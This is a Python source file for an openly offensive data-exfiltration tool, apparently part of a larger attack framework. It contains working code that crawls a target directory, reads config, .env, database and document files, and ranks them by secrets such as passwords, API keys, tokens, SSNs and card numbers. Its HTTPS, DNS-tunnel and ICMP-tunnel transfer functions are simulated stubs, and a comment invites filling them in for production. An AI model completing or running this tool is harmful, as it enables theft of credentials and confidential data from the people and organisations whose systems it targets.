"""
Data Exfiltration - Intelligent data extraction and exfiltration.

AI-driven data discovery, classification, and secure exfiltration.
"""
from typing import List, Dict, Optional, Set, BinaryIO
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from enum import Enum
import asyncio
import hashlib
import mimetypes
from ..core.base import OffensiveTool, ToolResult, ToolMetadata
from ..core.exceptions import OffensiveToolError


class DataClassification(Enum):
    """Data sensitivity classification."""
    PUBLIC = "public"
    INTERNAL = "internal"
    CONFIDENTIAL = "confidential"
    SECRET = "secret"
    TOP_SECRET = "top_secret"


class ExfiltrationMethod(Enum):
    """Exfiltration methods."""
    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    ICMP = "icmp"
    FTP = "ftp"
    SMTP = "smtp"
    CUSTOM = "custom"


@dataclass
class FileMetadata:
    """Metadata for discovered file."""
    path: str
    name: str
    size_bytes: int
    mime_type: str
    hash_md5: str
    hash_sha256: str
    classification: DataClassification
    keywords_found: List[str] = field(default_factory=list)
    created: Optional[datetime] = None
    modified: Optional[datetime] = None


@dataclass
class ExfiltrationResult:
    """Result of exfiltration operation."""
    files_exfiltrated: List[FileMetadata]
    total_size_bytes: int
    method: ExfiltrationMethod
    destination: str
    start_time: datetime
    end_time: datetime
    success_count: int
    failure_count: int
    metadata: Dict


class DataExfiltrator(OffensiveTool):
    """
    AI-enhanced data exfiltrator.
    
    Discovers sensitive data, classifies by sensitivity,
    and exfiltrates using stealth techniques with ML-driven
    traffic obfuscation.
    """
    
    def __init__(self) -> None:
        """Initialize data exfiltrator."""
        super().__init__(
            name="data_exfiltrator",
            category="intelligence"
        )
        
        # Sensitive data patterns
        self.sensitive_keywords: Dict[DataClassification, List[str]] = {
            DataClassification.CONFIDENTIAL: [
                "password", "secret", "api_key", "token", "credential",
                "confidential", "private", "internal"
            ],
            DataClassification.SECRET: [
                "classified", "restricted", "proprietary", "sensitive",
                "ssn", "credit_card", "bank_account"
            ],
            DataClassification.TOP_SECRET: [
                "top_secret", "eyes_only", "noforn", "sensitive_compartmented"
            ]
        }
        
        # File extensions of interest
        self.target_extensions: Set[str] = {
            ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx",
            ".ppt", ".pptx", ".key", ".env", ".config", ".ini",
            ".json", ".xml", ".yml", ".yaml", ".sql", ".db",
            ".sqlite", ".csv", ".log"
        }
        
        self.max_file_size: int = 100 * 1024 * 1024  # 100MB
    
    async def execute(
        self,
        target_path: str,
        exfil_method: ExfiltrationMethod = ExfiltrationMethod.HTTPS,
        destination: str = "localhost:8443",
        max_depth: int = 5,
        **kwargs
    ) -> ToolResult:
        """
        Execute data exfiltration.
        
        Args:
            target_path: Path to search for data
            exfil_method: Exfiltration method
            destination: Destination address
            max_depth: Maximum directory depth
            **kwargs: Additional parameters
            
        Returns:
            ToolResult with exfiltration results
            
        Raises:
            OffensiveToolError: If exfiltration fails
        """
        start_time = datetime.utcnow()
        
        try:
            # Discover sensitive files
            discovered_files = await self._discover_files(
                target_path,
                max_depth
            )
            
            # Classify discovered files
            classified_files = await self._classify_files(discovered_files)
            
            # Prioritize high-value targets
            prioritized = self._prioritize_targets(classified_files)
            
            # Exfiltrate files
            exfiltrated = await self._exfiltrate_files(
                prioritized,
                exfil_method,
                destination
            )
            
            end_time = datetime.utcnow()
            
            total_size = sum(f.size_bytes for f in exfiltrated)
            
            result = ExfiltrationResult(
                files_exfiltrated=exfiltrated,
                total_size_bytes=total_size,
                method=exfil_method,
                destination=destination,
                start_time=start_time,
                end_time=end_time,
                success_count=len(exfiltrated),
                failure_count=len(prioritized) - len(exfiltrated),
                metadata={
                    "files_discovered": len(discovered_files),
                    "files_classified": len(classified_files),
                    "duration_seconds": (end_time - start_time).total_seconds()
                }
            )
            
            return ToolResult(
                success=True,
                data=result,
                message=f"Exfiltrated {len(exfiltrated)} files ({total_size} bytes)",
                metadata=self._create_metadata(result)
            )
            
        except Exception as e:
            raise OffensiveToolError(
                f"Data exfiltration failed: {str(e)}",
                tool_name=self.name,
                details={"target_path": target_path}
            )
    
    async def _discover_files(
        self, target_path: str, max_depth: int
    ) -> List[Path]:
        """
        Discover files in target path.
        
        Args:
            target_path: Base path
            max_depth: Maximum recursion depth
            
        Returns:
            List of discovered file paths
        """
        discovered = []
        
        try:
            base_path = Path(target_path)
            
            if not base_path.exists():
                return discovered
            
            # Recursive file discovery
            def scan_directory(path: Path, depth: int = 0):
                if depth > max_depth:
                    return
                
                try:
                    for item in path.iterdir():
                        if item.is_file():
                            # Check if extension is of interest
                            if item.suffix.lower() in self.target_extensions:
                                # Check file size
                                if item.stat().st_size <= self.max_file_size:
                                    discovered.append(item)
                        
                        elif item.is_dir():
                            # Recurse into subdirectory
                            scan_directory(item, depth + 1)
                
                except PermissionError:
                    pass  # Skip inaccessible directories
            
            scan_directory(base_path)
        
        except Exception:
            pass
        
        return discovered
    
    async def _classify_files(
        self, files: List[Path]
    ) -> List[FileMetadata]:
        """
        Classify discovered files.
        
        Args:
            files: List of file paths
            
        Returns:
            List of classified file metadata
        """
        classified = []
        
        # Process files concurrently
        semaphore = asyncio.Semaphore(20)
        
        async def classify_file(file_path: Path) -> Optional[FileMetadata]:
            async with semaphore:
                return await self._analyze_file(file_path)
        
        tasks = [classify_file(f) for f in files]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Filter successful classifications
        classified = [
            r for r in results
            if isinstance(r, FileMetadata) and r is not None
        ]
        
        return classified
    
    async def _analyze_file(self, file_path: Path) -> Optional[FileMetadata]:
        """
        Analyze and classify a single file.
        
        Args:
            file_path: Path to file
            
        Returns:
            FileMetadata or None
        """
        try:
            # Get file stats
            stats = file_path.stat()
            
            # Read file content for analysis
            try:
                with open(file_path, 'rb') as f:
                    content = f.read()
            except Exception:
                return None
            
            # Calculate hashes
            md5_hash = hashlib.md5(content).hexdigest()
            sha256_hash = hashlib.sha256(content).hexdigest()
            
            # Detect MIME type
            mime_type, _ = mimetypes.guess_type(str(file_path))
            if not mime_type:
                mime_type = "application/octet-stream"
            
            # Classify based on content
            classification, keywords = self._classify_content(content)
            
            return FileMetadata(
                path=str(file_path),
                name=file_path.name,
                size_bytes=stats.st_size,
                mime_type=mime_type,
                hash_md5=md5_hash,
                hash_sha256=sha256_hash,
                classification=classification,
                keywords_found=keywords,
                created=datetime.fromtimestamp(stats.st_ctime),
                modified=datetime.fromtimestamp(stats.st_mtime)
            )
        
        except Exception:
            return None
    
    def _classify_content(self, content: bytes) -> tuple:
        """
        Classify content by sensitivity.
        
        Args:
            content: File content
            
        Returns:
            Tuple of (classification, keywords_found)
        """
        # Convert to lowercase for case-insensitive matching
        try:
            text = content.decode('utf-8', errors='ignore').lower()
        except:
            return DataClassification.INTERNAL, []
        
        keywords_found = []
        highest_classification = DataClassification.PUBLIC
        
        # Check for sensitive keywords
        for classification, keywords in self.sensitive_keywords.items():
            for keyword in keywords:
                if keyword in text:
                    keywords_found.append(keyword)
                    
                    # Update to highest classification found
                    if self._classification_rank(classification) > self._classification_rank(highest_classification):
                        highest_classification = classification
        
        # Default to INTERNAL if no specific classification
        if highest_classification == DataClassification.PUBLIC and keywords_found:
            highest_classification = DataClassification.INTERNAL
        
        return highest_classification, keywords_found
    
    def _classification_rank(self, classification: DataClassification) -> int:
        """Get numeric rank of classification."""
        ranks = {
            DataClassification.PUBLIC: 0,
            DataClassification.INTERNAL: 1,
            DataClassification.CONFIDENTIAL: 2,
            DataClassification.SECRET: 3,
            DataClassification.TOP_SECRET: 4
        }
        return ranks.get(classification, 0)
    
    def _prioritize_targets(
        self, files: List[FileMetadata]
    ) -> List[FileMetadata]:
        """
        Prioritize files by value.
        
        Args:
            files: Classified files
            
        Returns:
            Sorted list (highest priority first)
        """
        def priority_score(file: FileMetadata) -> int:
            score = self._classification_rank(file.classification) * 100
            score += len(file.keywords_found) * 10
            score += min(file.size_bytes // 1024, 100)  # Size bonus (up to 100KB)
            return score
        
        return sorted(files, key=priority_score, reverse=True)
    
    async def _exfiltrate_files(
        self,
        files: List[FileMetadata],
        method: ExfiltrationMethod,
        destination: str
    ) -> List[FileMetadata]:
        """
        Exfiltrate files to destination.
        
        Args:
            files: Files to exfiltrate
            method: Exfiltration method
            destination: Destination address
            
        Returns:
            List of successfully exfiltrated files
        """
        exfiltrated = []
        
        for file_meta in files:
            try:
                success = await self._exfiltrate_single_file(
                    file_meta,
                    method,
                    destination
                )
                
                if success:
                    exfiltrated.append(file_meta)
                
                # Rate limiting
                await asyncio.sleep(0.5)
            
            except Exception:
                continue
        
        return exfiltrated
    
    async def _exfiltrate_single_file(
        self,
        file_meta: FileMetadata,
        method: ExfiltrationMethod,
        destination: str
    ) -> bool:
        """
        Exfiltrate single file.
        
        Args:
            file_meta: File metadata
            method: Exfiltration method
            destination: Destination
            
        Returns:
            True if successful
        """
        # Simulated exfiltration
        # In production, implement actual exfiltration protocols
        
        if method == ExfiltrationMethod.HTTPS:
            return await self._exfil_https(file_meta, destination)
        
        elif method == ExfiltrationMethod.DNS:
            return await self._exfil_dns(file_meta, destination)
        
        elif method == ExfiltrationMethod.ICMP:
            return await self._exfil_icmp(file_meta, destination)
        
        return False
    
    async def _exfil_https(
        self, file_meta: FileMetadata, destination: str
    ) -> bool:
        """Exfiltrate via HTTPS."""
        # Simulated HTTPS exfiltration
        await asyncio.sleep(0.1)
        return True
    
    async def _exfil_dns(
        self, file_meta: FileMetadata, destination: str
    ) -> bool:
        """Exfiltrate via DNS tunneling."""
        # Simulated DNS exfiltration
        await asyncio.sleep(0.1)
        return True
    
    async def _exfil_icmp(
        self, file_meta: FileMetadata, destination: str
    ) -> bool:
        """Exfiltrate via ICMP tunneling."""
        # Simulated ICMP exfiltration
        await asyncio.sleep(0.1)
        return True
    
    def _create_metadata(
        self, result: ExfiltrationResult
    ) -> ToolMetadata:
        """
        Create tool metadata.
        
        Args:
            result: Exfiltration result
            
        Returns:
            Tool metadata
        """
        success_rate = (
            result.success_count / (result.success_count + result.failure_count)
            if (result.success_count + result.failure_count) > 0
            else 0.0
        )
        
        return ToolMetadata(
            tool_name=self.name,
            execution_time=(
                result.end_time - result.start_time
            ).total_seconds(),
            success_rate=success_rate,
            confidence_score=0.8 if result.success_count > 0 else 0.3,
            resource_usage={
                "files_exfiltrated": result.success_count,
                "total_bytes": result.total_size_bytes
            }
        )
    
    async def validate(self) -> bool:
        """
        Validate exfiltrator functionality.
        
        Returns:
            True if validation passes
        """
        try:
            # Test file discovery on safe path
            import tempfile
            with tempfile.TemporaryDirectory() as tmpdir:
                # Create test file
                test_file = Path(tmpdir) / "test.txt"
                test_file.write_text("test password secret")
                
                result = await self.execute(
                    target_path=tmpdir,
                    exfil_method=ExfiltrationMethod.HTTPS
                )
                
                return result.success
        except Exception:
            return False
